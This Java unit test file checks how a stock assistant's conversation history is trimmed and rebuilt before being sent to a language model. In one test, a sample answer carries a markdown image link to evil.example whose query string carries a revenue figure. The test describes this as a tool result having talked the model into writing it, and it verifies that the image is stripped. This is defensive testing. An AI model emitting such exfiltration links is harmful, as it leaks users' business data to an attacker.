package com.stockflow.assistant.internal.domain;

import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;

import java.util.ArrayList;
import java.util.List;

import static org.assertj.core.api.Assertions.assertThat;

/** Design §3.1: what of a conversation is sent with a new question. */
class HistoryTest {

    private static Turn.ModelTurn text(String text) {
        return new Turn.ModelTurn("{\"text\":\"" + text + "\"}", text, List.of());
    }

    private static List<Turn> exchange(int n) {
        ToolCall call = new ToolCall("toolu_" + n, "getStockLevels", "{}");
        return List.of(new Turn.Question("Q" + n, "ctx"), new Turn.ModelTurn("{}", null, List.of(call)),
                new Turn.ToolResults(List.of(new ToolResult("toolu_" + n, "{\"rows\":" + n + "}", false))),
                text("A" + n));
    }

    @Test
    @DisplayName("earlier questions keep their final answer only; the current one keeps every turn")
    void earlierAnswersOnly() {
        List<Turn> turns = new ArrayList<>(exchange(1));
        turns.add(new Turn.Question("Q2", "ctx"));
        ToolCall pending = new ToolCall("toolu_2", "findOrder", "{}");
        turns.add(new Turn.ModelTurn("{}", null, List.of(pending)));
        turns.add(new Turn.ToolResults(List.of(new ToolResult("toolu_2", "{}", false))));

        List<Turn> sent = History.forModel(turns, HistoryTest::text);

        assertThat(sent).hasSize(5);
        assertThat(sent.get(0)).isEqualTo(turns.get(0));
        assertThat(((Turn.ModelTurn) sent.get(1)).text()).isEqualTo("A1");
        assertThat(((Turn.ModelTurn) sent.get(1)).toolCalls()).isEmpty();
        assertThat(sent.subList(2, 5)).containsExactlyElementsOf(turns.subList(4, 7));
    }

    @Test
    @DisplayName("an earlier answer goes back as the panel showed it: an image some tool result talked the model "
            + "into writing is not handed back to it as its own words; a closing turn's message counts as the answer")
    void earlierAnswersAsShown() {
        String injected = "Doanh thu ![x [y]](//evil.example/p.png?d=12500000) đây";
        List<Turn> turns = new ArrayList<>(List.of(new Turn.Question("Q1", "ctx"), text(injected)));
        turns.addAll(exchange(2).subList(0, 3));
        turns.add(text("Trợ lý tạm thời không trả lời được, vui lòng thử lại sau ít phút"));
        turns.add(new Turn.Question("now", "ctx"));

        List<Turn> sent = History.forModel(turns, HistoryTest::text);

        assertThat(((Turn.ModelTurn) sent.get(1)).text()).isEqualTo(AnswerText.plain(injected)).doesNotContain("![");
        assertThat(((Turn.ModelTurn) sent.get(3)).text())
                .isEqualTo("Trợ lý tạm thời không trả lời được, vui lòng thử lại sau ít phút");
        assertThat(sent).hasSize(5);
    }

    @Test
    @DisplayName("an earlier answer goes back as a text turn of the model called, whichever model or provider wrote "
            + "it: no thinking block, thought signature or tool id of another model is sent")
    void earlierAnswersRebuiltForTheModelCalled() {
        Turn.ModelTurn byClaude = new Turn.ModelTurn("{\"role\":\"assistant\",\"content\":[{\"type\":\"thinking\","
                + "\"thinking\":\"\",\"signature\":\"EqQB-claude\"},{\"type\":\"text\",\"text\":\"Còn 40 cái.\"}]}",
                "Còn 40 cái.", List.of());
        Turn.ModelTurn byFlashLite = new Turn.ModelTurn("{\"role\":\"model\",\"parts\":[{\"text\":\"Còn 12 cái.\","
                + "\"thoughtSignature\":\"Eu0C-flash-lite\"}]}", "Còn 12 cái.", List.of());
        List<Turn> turns = new ArrayList<>(List.of(new Turn.Question("Q1", "ctx"), byClaude));
        turns.addAll(exchange(2).subList(0, 3));
        turns.add(byFlashLite);
        turns.add(new Turn.Question("now", "ctx"));

        List<Turn> sent = History.forModel(turns,
                text -> new Turn.ModelTurn("{\"by\":\"gemini-3.5-flash\"}", text, List.of()));

        assertThat(sent).hasSize(5);
        assertThat(sent).filteredOn(Turn.ModelTurn.class::isInstance)
                .extracting(turn -> ((Turn.ModelTurn) turn).providerContent())
                .containsOnly("{\"by\":\"gemini-3.5-flash\"}");
        assertThat(((Turn.ModelTurn) sent.get(1)).text()).isEqualTo("Còn 40 cái.");
        assertThat(((Turn.ModelTurn) sent.get(3)).text()).isEqualTo("Còn 12 cái.");
        assertThat(((Turn.ModelTurn) sent.get(3)).toolCalls()).isEmpty();
    }

    @Test
    @DisplayName("only the last ten earlier questions are sent, and a long or missing answer is marked")
    void bounded() {
        List<Turn> turns = new ArrayList<>();
        for (int i = 1; i <= 12; i++) {
            turns.addAll(exchange(i));
        }
        turns.add(new Turn.Question("broken", "ctx"));
        turns.add(new Turn.ModelTurn("{}", null, List.of(new ToolCall("toolu_x", "findOrder", "{}"))));
        turns.add(new Turn.Question("long", "ctx"));
        turns.add(text("x".repeat(History.EARLIER_ANSWER_LENGTH + 50)));
        turns.add(new Turn.Question("now", "ctx"));

        List<Turn> sent = History.forModel(turns, HistoryTest::text);

        assertThat(sent).hasSize(2 * History.EARLIER_QUESTIONS + 1);
        assertThat(((Turn.Question) sent.getFirst()).text()).isEqualTo("Q5");
        assertThat(((Turn.ModelTurn) sent.get(sent.size() - 4)).text()).isEqualTo(History.NOT_ANSWERED);
        assertThat(((Turn.ModelTurn) sent.get(sent.size() - 2)).text())
                .hasSize(History.EARLIER_ANSWER_LENGTH + 4).endsWith(" […]");
        assertThat(((Turn.Question) sent.getLast()).text()).isEqualTo("now");
    }
}
